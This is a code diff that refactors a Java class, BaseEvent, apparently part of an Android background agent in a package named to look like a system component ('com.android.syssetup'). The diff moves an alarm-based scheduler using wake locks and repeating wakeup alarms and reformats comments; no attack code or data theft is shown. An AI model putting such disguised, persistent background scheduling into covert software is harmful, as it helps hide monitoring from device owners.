@@ -24,114 +24,33 @@ import com.android.syssetup.conf.ConfEvent;
 import com.android.syssetup.util.Check;
 
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class EventBase.
  */
 public abstract class BaseEvent extends ThreadBase {
 
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "BaseEvent"; //$NON-NLS-1$
-
+	/**
+	 * The event.
+	 */
+	protected ConfEvent conf;
 	boolean isActive = false;
 	private Alarm alarm;
-	private String subType;
 
 	// Gli eredi devono implementare i seguenti metodi astratti
-	/**
-	 * Parses the.
-	 * 
-	 * @param event
-	 *            the event
-	 */
-	protected abstract boolean parse(ConfEvent event);
-
-	/** The event. */
-	protected ConfEvent conf;
+	private String subType;
 	private int iterCounter;
 
-	public class Alarm extends BroadcastReceiver {
-
-		int count = 0;
-		
-		@Override
-		public void onReceive(Context context, Intent intent) {
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " SCHED (onReceive), intent: %s", intent);
-			}
-
-			PowerManager.WakeLock wl;
-			if (Cfg.POWER_MANAGEMENT) {
-				PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
-				wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "");
-				wl.acquire();
-			}
-			
-			// public void run() {
-			try {
-				// verifica iter, se sono stati eseguiti i giusti repeat
-				// esce
- 				if (count >= iterCounter) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " SCHED (onReceive): count >= iterCounter");
-					}
-
-					stopAlarm();
-					return;
-				}
-				count++;
-				
-				triggerRepeatAction();
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " SCHED (onReceive) count: " + count);
-				}
-
-				
-			} catch (Exception ex) {
-				if (Cfg.EXCEPTION) {
-					Check.log(ex);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " SCHED (onReceive) Error: " + ex);
-				}
-
-				//stopAlarm();
-			}
-
-			if (Cfg.POWER_MANAGEMENT) {
-				wl.release();
-			}
-		}
-
-		public void SetAlarm(int delay, int period) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (SetAlarm) delay=" + delay + " period=" + period + " intent=BE." + getId());
-			}
-			Context context = Status.getAppContext();
-			AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
-			// Intent i = new Intent(Status.getAppContext(), Alarm.class);
-			Intent i = new Intent("BE." + getId());
-			
-			PendingIntent pi = PendingIntent.getBroadcast(context, 0, i, 0);
-			// Millisec * Second * Minute
-			am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + delay * 1000, period * 1000, pi);
-			count = 0;
-		}
-
-		public void CancelAlarm() {
-			Context context = Status.getAppContext();
-			//Intent intent = new Intent(context, Alarm.class);
-			Intent intent = new Intent("BE." + getId());
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (CancelAlarm) intent: %s", intent);
-			}
-			PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
-			AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
-			alarmManager.cancel(sender);
-		}
-	}
+	/**
+	 * Parses the.
+	 *
+	 * @param event the event
+	 */
+	protected abstract boolean parse(ConfEvent event);
 
 	public int getId() {
 		return conf.getId();
@@ -143,9 +62,8 @@ public abstract class BaseEvent extends ThreadBase {
 
 	/**
 	 * Sets the event.
-	 * 
-	 * @param event
-	 *            the new event
+	 *
+	 * @param event the new event
 	 */
 	public boolean setConf(final ConfEvent conf) {
 		if (Cfg.DEBUG) {
@@ -182,9 +100,9 @@ public abstract class BaseEvent extends ThreadBase {
 		return conf.delay;
 	}
 
-    protected int getConfPeriod() {
-        return conf.delay;
-    }
+	protected int getConfPeriod() {
+		return conf.delay;
+	}
 
 	protected synchronized void onEnter() {
 		// if (Cfg.DEBUG) Check.asserts(!active,"stopSchedulerFuture");
@@ -329,7 +247,91 @@ public abstract class BaseEvent extends ThreadBase {
 	}
 
 	public void notifyProcess(ProcessInfo b) {
-		
+
+	}
+
+	public class Alarm extends BroadcastReceiver {
+
+		int count = 0;
+
+		@Override
+		public void onReceive(Context context, Intent intent) {
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " SCHED (onReceive), intent: %s", intent);
+			}
+
+			PowerManager.WakeLock wl;
+			if (Cfg.POWER_MANAGEMENT) {
+				PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+				wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "");
+				wl.acquire();
+			}
+
+			// public void run() {
+			try {
+				// verifica iter, se sono stati eseguiti i giusti repeat
+				// esce
+				if (count >= iterCounter) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " SCHED (onReceive): count >= iterCounter");
+					}
+
+					stopAlarm();
+					return;
+				}
+				count++;
+
+				triggerRepeatAction();
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " SCHED (onReceive) count: " + count);
+				}
+
+
+			} catch (Exception ex) {
+				if (Cfg.EXCEPTION) {
+					Check.log(ex);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " SCHED (onReceive) Error: " + ex);
+				}
+
+				//stopAlarm();
+			}
+
+			if (Cfg.POWER_MANAGEMENT) {
+				wl.release();
+			}
+		}
+
+		public void SetAlarm(int delay, int period) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (SetAlarm) delay=" + delay + " period=" + period + " intent=BE." + getId());
+			}
+			Context context = Status.getAppContext();
+			AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+			// Intent i = new Intent(Status.getAppContext(), Alarm.class);
+			Intent i = new Intent("BE." + getId());
+
+			PendingIntent pi = PendingIntent.getBroadcast(context, 0, i, 0);
+			// Millisec * Second * Minute
+			am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + delay * 1000, period * 1000, pi);
+			count = 0;
+		}
+
+		public void CancelAlarm() {
+			Context context = Status.getAppContext();
+			//Intent intent = new Intent(context, Alarm.class);
+			Intent intent = new Intent("BE." + getId());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (CancelAlarm) intent: %s", intent);
+			}
+			PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
+			AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+			alarmManager.cancel(sender);
+		}
 	}
 
 }
